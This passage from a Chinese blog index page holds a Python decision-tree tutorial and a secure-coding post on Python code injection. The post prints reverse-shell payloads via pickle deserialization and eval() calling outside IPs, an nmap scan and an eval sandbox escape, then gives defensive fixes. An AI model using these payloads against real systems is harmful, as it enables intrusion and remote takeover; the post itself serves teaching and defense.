division</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_shannon_ent</span>(<span class="params">data_set</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算香农熵</span></span><br><span class="line"><span class="string">    :param data_set:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data_length = <span class="built_in">len</span>(data_set)</span><br><span class="line">    label_counts = Counter([val[-<span class="number">1</span>] <span class="keyword">for</span> val <span class="keyword">in</span> data_set])</span><br><span class="line">    pilog2pi = [val / data_length * math.log(val / data_length, <span class="number">2</span>) <span class="keyword">for</span> val <span class="keyword">in</span> label_counts.itervalues()]</span><br><span class="line">    <span class="keyword">return</span> - reduce(</span><br><span class="line">        operator.add,</span><br><span class="line">        pilog2pi</span><br><span class="line">    ) <span class="keyword">if</span> pilog2pi <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data_set</span>(<span class="params">data_set, axis, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    分割数据集，筛选指定特征下的数据值的集合</span></span><br><span class="line"><span class="string">    :param data_set: 数据集合</span></span><br><span class="line"><span class="string">    :param axis: 第几列</span></span><br><span class="line"><span class="string">    :param value: 筛选的值</span></span><br><span class="line"><span class="string">    :return: 除去axis列的，并且axis列的值为value的的数据集合</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [[v <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(val) <span class="keyword">if</span> i != axis] <span class="keyword">for</span> val <span class="keyword">in</span> data_set <span class="keyword">if</span> val[axis] == value]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_best_feature_to_split</span>(<span class="params">data_set</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    选择最好的数据集划分方式</span></span><br><span class="line"><span class="string">    :param data_set: 数据集</span></span><br><span class="line"><span class="string">    :return: 划分方式最好是第几项</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    base_ent = calc_shannon_ent(data_set)</span><br><span class="line">    <span class="comment"># 定义最好的信息增益，信息增益最好的那项</span></span><br><span class="line">    best_info_gain, best_feature = <span class="number">0.0</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_set[<span class="number">0</span>]) - <span class="number">1</span>):</span><br><span class="line">        unique_value = <span class="built_in">set</span>(data_set[i])</span><br><span class="line">        child_ent = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> unique_value:</span><br><span class="line">            child_data_set = split_data_set(data_set, i, val)</span><br><span class="line">            child_ent += (<span class="built_in">len</span>(data_set) - <span class="number">1</span>) / <span class="built_in">len</span>(data_set) * calc_shannon_ent(child_data_set)</span><br><span class="line">        <span class="comment"># 信息增益</span></span><br><span class="line">        info_gain = base_ent - child_ent</span><br><span class="line">        <span class="keyword">if</span> info_gain &gt; best_info_gain:</span><br><span class="line">            best_info_gain = info_gain</span><br><span class="line">            best_feature = i</span><br><span class="line">    <span class="keyword">return</span> best_feature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">majority_ent</span>(<span class="params">class_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    取出出现次数最多的标签</span></span><br><span class="line"><span class="string">    :param class_list:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    class_count = Counter(class_list)</span><br><span class="line">    sorted_class_count = <span class="built_in">sorted</span>(class_count.items(), key=<span class="keyword">lambda</span> x, y: cmp(x[<span class="number">1</span>], y[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sorted_class_count[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tree</span>(<span class="params">data_set, labels</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建树</span></span><br><span class="line"><span class="string">    :param data_set: 数据集</span></span><br><span class="line"><span class="string">    :param labels: 标签集合</span></span><br><span class="line"><span class="string">    :return: 决策树</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    class_list = [val[-<span class="number">1</span>] <span class="keyword">for</span> val <span class="keyword">in</span> data_set]</span><br><span class="line">    <span class="keyword">if</span> class_list.count(class_list[<span class="number">0</span>]) == <span class="built_in">len</span>(class_list):</span><br><span class="line">        <span class="keyword">return</span> class_list[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data_set[<span class="number">0</span>]) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> majority_ent(class_list)</span><br><span class="line">    best_feat = choose_best_feature_to_split(data_set)</span><br><span class="line">    best_feat_label = labels[best_feat]</span><br><span class="line">    my_tree = &#123;best_feat_label: &#123;&#125;&#125;</span><br><span class="line">    <span class="keyword">del</span> labels[best_feat]</span><br><span class="line">    feat_values = [val[best_feat] <span class="keyword">for</span> val <span class="keyword">in</span> data_set]</span><br><span class="line">    unique_vals = <span class="built_in">set</span>(feat_values)</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> unique_vals:</span><br><span class="line">        sub_labels = labels[:]</span><br><span class="line">        my_tree[best_feat_label][value] = create_tree(split_data_set(data_set, best_feat, value), sub_labels)</span><br><span class="line">    <span class="keyword">return</span> my_tree</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data_set = [[<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&#x27;no&#x27;</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;no&#x27;</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;no&#x27;</span>]]</span><br><span class="line">    <span class="comment"># 计算熵</span></span><br><span class="line">    <span class="built_in">print</span> calc_shannon_ent(data_set)</span><br><span class="line">    <span class="comment"># 分割数据集</span></span><br><span class="line">    <span class="built_in">print</span> split_data_set(data_set, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 获取最大信息增益项</span></span><br><span class="line">    <span class="built_in">print</span> choose_best_feature_to_split(data_set)</span><br><span class="line">    <span class="comment"># 生成决策树</span></span><br><span class="line">    <span class="built_in">print</span> create_tree(data_set, [<span class="string">&#x27;no surfacing&#x27;</span>, <span class="string">&#x27;flippers&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h2 id="ID3算法"><a href="#ID3算法" class="headerlink" title="ID3算法"></a>ID3算法</h2><blockquote>
<p>ID3算法就是在每次需要分裂时，计算每个属性的增益率，然后选择增益率最大的属性进行分裂。</p>
</blockquote>
<h2 id="C4-5算法"><a href="#C4-5算法" class="headerlink" title="C4.5算法"></a>C4.5算法</h2><p>定义分裂信息。<br>$$ split\<em>info_A(D) &#x3D; - \sum</em>{j&#x3D;1}^v \frac{|D_j|}{|D|} log_2(\frac{|D_j|}{|D|}) $$<br>定义增益率。<br>$$ gain\_ratio(A) &#x3D; \frac{gain(A)}{split\_info(A)} $$</p>
<blockquote>
<p>C4.5选择具有最大增益率的属性作为分裂属性。<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/leoo2sk/archive/2010/09/19/decision-tree.html">http://www.cnblogs.com/leoo2sk/archive/2010/09/19/decision-tree.html</a><br>决策树到底是干嘛用的，怎么去灵活运用决策树？</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/10/16/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/10/16/1.html" class="post-title-link" itemprop="url">Python安全编码-代码注入的实践与防范</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2016-10-16T00:00:00+00:00">2016-10-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="什么是代码注入"><a href="#什么是代码注入" class="headerlink" title="什么是代码注入"></a>什么是代码注入</h2><p>代码注入攻击指的是任何允许攻击者在网络应用程序中注入源代码，从而得到解读和执行的方法。</p>
<p>###Python中常见代码注入<br>能够执行一行任意字符串形式代码的eval()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<p>能够执行字符串形式代码块的exec()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<p>反序列化一个pickled对象时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pickle.loads(&quot;cposix\nsystem\np0\n(S&#x27;uname -a&#x27;\np1\ntp2\nRp3\n.&quot;)</span><br></pre></td></tr></table></figure>
<p>执行一个Python文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&quot;testf.py&quot;)</span><br></pre></td></tr></table></figure>

<p>pickle.loads()代码注入<br>某不安全的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def load_session(self, session_id=None):</span><br><span class="line">    if not session_id:</span><br><span class="line">        session_id = self.gen_session_id()</span><br><span class="line">        session = Session(session_id, self)</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            data = self.backend.get(session_id)</span><br><span class="line">            if data:</span><br><span class="line">                data = pickle.loads(data)</span><br><span class="line">                assert type(data) == dict</span><br><span class="line">            else:</span><br><span class="line">                data = &#123;&#125;</span><br><span class="line">        except:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line">        session = Session(session_id, self, data)</span><br><span class="line">return session</span><br></pre></td></tr></table></figure>
<p>注入的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; class exp(object):</span><br><span class="line">...     def __reduce__(self):</span><br><span class="line">...         s = &quot;/bin/bash -c \&quot;/bin/bash -i &gt; \/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\&quot;&quot;</span><br><span class="line">...         return (os.system, (s,))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; e = exp()</span><br><span class="line">&gt;&gt;&gt; e</span><br><span class="line">&lt;__main__.exp object at 0x7f734afa8790&gt;</span><br><span class="line">&gt;&gt;&gt; k = pickle.dumps(e)</span><br><span class="line">&#x27;cposix\nsystem\np0\n(S\&#x27;/bin/bash -c &quot;/bin/bash -i &gt; \\\\/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;&quot;\&#x27;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; pickle.loads(k)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[3]+  Stopped                 python</span><br></pre></td></tr></table></figure>


<h3 id="这些函数使用不当都很危险"><a href="#这些函数使用不当都很危险" class="headerlink" title="这些函数使用不当都很危险"></a>这些函数使用不当都很危险</h3><p>os.system<br>os.popen*<br>os.spawn*<br>os.exec*<br>os.open<br>os.popen*<br>commands.*<br>subprocess.popen<br>popen2.*</p>
<h2 id="一次模拟的实践"><a href="#一次模拟的实践" class="headerlink" title="一次模拟的实践"></a>一次模拟的实践</h2><p>通过这次实践发现系统中的诸多安全薄弱的环节，执行流程如下：</p>
<ol>
<li>nmap扫描IP<code> nmap -v -A *.*.*.* -p 1-65535</code>，通过nmap扫描后会发现公开的服务。</li>
<li>暴力破解登录名密码<code> test 123</code>，弱口令登陆系统。这个地方的薄弱点在于开发过程中容易留下便于程序员测试后门或若口令。</li>
<li>成功登陆系统后寻找代码注入点，通过成功找到注入点后可执行代码注入通过反向shell连接服务器提权<code>eval(&quot;__import__(&#39;os&#39;).system(&#39;/bin/bash -c \&quot;/bin/bash -i &gt; /dev/tcp/10.10.10.130/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\&quot;&#39;)&quot;)</code></li>
</ol>
<p>todo 第三步在整个系统中发现了两个可进行代码注入的漏洞，第一个为pickl反序列化用户登录信息的时候没有做校验，这样当对应的存储介质（memcache、redis）没有开启登录认证并且暴漏在公网中很容易注入代码。第二个为在系统中一些配置直接使用eval函数执行配置中的Python代码进行注入。<br>todo 反向shell介绍</p>
<h2 id="如何安全编码"><a href="#如何安全编码" class="headerlink" title="如何安全编码"></a>如何安全编码</h2><ol>
<li>严格控制输入，过滤所有危险模块，遇到非法字符直接返回。</li>
<li>使用ast.literal_eval()代替eval()</li>
<li>安全使用pickle</li>
</ol>
<p>下面就着几个点来说一下：</p>
<h4 id="eval-方法注释："><a href="#eval-方法注释：" class="headerlink" title="eval()方法注释："></a>eval()方法注释：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(source[, globals[, locals]]) -&gt; value</span><br><span class="line">Evaluate the source in the context of globals and locals. The source may be a string representing a Python expression or a code object as returned by compile(). The globals must be a dictionary and locals can be any mapping, defaulting to the current globals and locals. If only globals is given, locals defaults to it.</span><br></pre></td></tr></table></figure>
<h4 id="ast-literal-eval-方法注释："><a href="#ast-literal-eval-方法注释：" class="headerlink" title="ast.literal_eval()方法注释："></a>ast.literal_eval()方法注释：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safely evaluate an expression node or a string containing a Python expression.  The string or node provided may only consist of the following Python literal structures: strings, numbers, tuples, lists, dicts, booleans, and None.</span><br></pre></td></tr></table></figure>


<h4 id="使用ast-literal-eval-代替eval-对比："><a href="#使用ast-literal-eval-代替eval-对比：" class="headerlink" title="使用ast.literal_eval()代替eval()对比："></a>使用ast.literal_eval()代替eval()对比：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ast.literal_eval(&quot;1+1&quot;)  # ValueError: malformed string</span><br><span class="line">ast.literal_eval(&quot;[1, 2, 3]&quot;)  # [1, 2, 3]</span><br><span class="line">ast.literal_eval(&quot;&#123;1: 1, 2: 2, 3: 3&#125;&quot;)  # &#123;1: 1, 2: 2, 3: 3&#125;</span><br><span class="line">ast.literal_eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)  # ValueError: malformed string</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&#125;, &#123;&#125;)  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&quot;__builtins__&quot;: &#123;&#125;&#125;, &#123;&#125;)  # NameError: name &#x27;__import__&#x27; is not defined</span><br></pre></td></tr></table></figure>

<h4 id="eval禁用全局或本地变量："><a href="#eval禁用全局或本地变量：" class="headerlink" title="eval禁用全局或本地变量："></a>eval禁用全局或本地变量：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; global_a = &quot;Hello Eval!&quot;</span><br><span class="line">&gt;&gt;&gt; eval(&quot;global_a&quot;)</span><br><span class="line">&gt;&gt;&gt; eval(&quot;global_a&quot;, &#123;&#125;, &#123;&#125;)</span><br></pre></td></tr></table></figure>


<h4 id="寻找eval的突破点"><a href="#寻找eval的突破点" class="headerlink" title="寻找eval的突破点"></a>寻找eval的突破点</h4><p><code>eval(&quot;[c for c in ().__class__.__bases__[0].__subclasses__()]&quot;, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;)</code></p>
<p>参考点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    lambda fc=(</span><br><span class="line">        lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]</span><br><span class="line">    ):</span><br><span class="line">    fc(&quot;function&quot;)(</span><br><span class="line">        fc(&quot;code&quot;)(</span><br><span class="line">            0, 0, 0, 0, &quot;KABOOM&quot;, (), (), (), &quot;&quot;, &quot;&quot;, 0, &quot;&quot;),</span><br><span class="line">        &#123;&#125;)()</span><br><span class="line">)()</span><br></pre></td></tr></table></figure>

<h4 id="安全使用pickle"><a href="#安全使用pickle" class="headerlink" title="安全使用pickle"></a>安全使用pickle</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import hmac</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; shared_key = &#x27;123456&#x27;</span><br><span class="line">&gt;&gt;&gt; class Exp(object):</span><br><span class="line">...     def __reduce__(self):</span><br><span class="line">...         s = &quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;</span><br><span class="line">...         return (os.system, (s,))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; e = Exp()</span><br><span class="line">&gt;&gt;&gt; s = pickle.dumps(e)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#x27;cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line">&gt;&gt;&gt; k = hmac.new(shared_key, s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; k</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;</span><br><span class="line">&gt;&gt;&gt; send_s = k + &#x27; &#x27; + s</span><br><span class="line">&gt;&gt;&gt; send_s</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line">&gt;&gt;&gt; recv_k, recv_s = send_s.split(&#x27; &#x27;, 1)</span><br><span class="line">&gt;&gt;&gt; recv_k, recv_s</span><br><span class="line">(&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;, &#x27;cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;)</span><br><span class="line">&gt;&gt;&gt; new_k = hmac.new(shared_key, recv_s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; new_k</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;</span><br><span class="line">&gt;&gt;&gt; diff_k = hmac.new(shared_key + &quot;123456&quot;, recv_s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; diff_k</span><br><span class="line">&#x27;381542893003a30d045c5c729713d2aa428128de&#x27;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="如何提高安全编码意识？"><a href="#如何提高安全编码意识？" class="headerlink" title="如何提高安全编码意识？"></a>如何提高安全编码意识？</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="http://www.programcreek.com/python/example/5578/ast.literal_eval">http://www.programcreek.com/python/example/5578/ast.literal_eval</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000002783940">https://segmentfault.com/a/1190000002783940</a><br><a target="_blank" rel="noopener" href="http://www.yunweipai.com/archives/6540.html">http://www.yunweipai.com/archives/6540.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/chence19871/article/details/32718219">http://blog.csdn.net/chence19871/article/details/32718219</a><br><a target="_blank" rel="noopener" href="http://coolshell.cn/articles/8711.html">http://coolshell.cn/articles/8711.html</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval">http://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval</a><br><a target="_blank" rel="noopener" href="https://www.cigital.com/blog/python-pickling/">https://www.cigital.com/blog/python-pickling/</a><br><a target="_blank" rel="noopener" href="https://github.com/greysign/pysec/blob/master/safeeval.py">https://github.com/greysign/pysec/blob/master/safeeval.py</a></p>
<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><h4 id="nmap扫描部分结果"><a href="#nmap扫描部分结果" class="headerlink" title="nmap扫描部分结果"></a>nmap扫描部分结果</h4><p>What is nmap?<br>Nmap (Network Mapper) is a security scanner originally written by Gordon Lyon used to discover hosts and services on a computer network, thus creating a “map” of the network.</p>
<p>-A: Enable OS detection, version detection, script scanning, and traceroute<br>-v: Increase verbosity level (use -vv or more for greater effect)<br>-p <port ranges>: Only scan specified ports</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# nmap -v -A *.*.*.* -p 1-65535 </span><br><span class="line">Starting Nmap 6.25 ( http://nmap.org ) at 2016-07-26 13:30 EDT</span><br><span class="line">......</span><br><span class="line">Not shown: 65527 filtered ports</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">1723/tcp  open   pptp        Microsoft</span><br><span class="line">8891/tcp  open   http        nginx 1.4.4</span><br><span class="line">9090/tcp  closed zeus-admin</span><br><span class="line">13228/tcp open   http        Microsoft IIS httpd 7.5</span><br><span class="line">14580/tcp closed unknown</span><br><span class="line">36666/tcp open   unknown</span><br><span class="line">64380/tcp open   unknown</span><br><span class="line">......</span><br><span class="line">Device type: general purpose|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 2.4.X (99%), Microsoft Windows 7 (95%), BlueArc embedded (91%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/o:microsoft:windows_7:::enterprise cpe:/h:bluearc:titan_2100</span><br><span class="line">Aggressive OS guesses: DD-WRT v24-sp2 (Linux 2.4.37) (99%), Microsoft Windows 7 Enterprise (95%), BlueArc Titan 2100 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">......</span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Read data files from: /usr/local/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 895.44 seconds</span><br><span class="line">           Raw packets sent: 262711 (11.560MB) | Rcvd: 55220 (2.209MB)</span><br></pre></td></tr></table></figure>
<p>Links：<br><a target="_blank" rel="noopener" href="http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/">http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/</a></p>
<h4 id="反向Shell"><a href="#反向Shell" class="headerlink" title="反向Shell"></a>反向Shell</h4><p><a target="_blank" rel="noopener" href="http://os.51cto.com/art/201312/424378.htm">http://os.51cto.com/art/201312/424378.htm</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/09/19/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/09/19/1.html" class="post-title-link" itemprop="url">《自品牌》读书笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-09-19 00:00:00" itemprop="dateCreated datePublished" datetime="2016-09-19T00:00:00+00:00">2016-09-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><img src="/resource/img/self_brand.png" alt="self_brand"></p>
<p><a href="/resource/file/self_brand.xmind">xmind文件</a></p>

      
    </div>

    
    
    

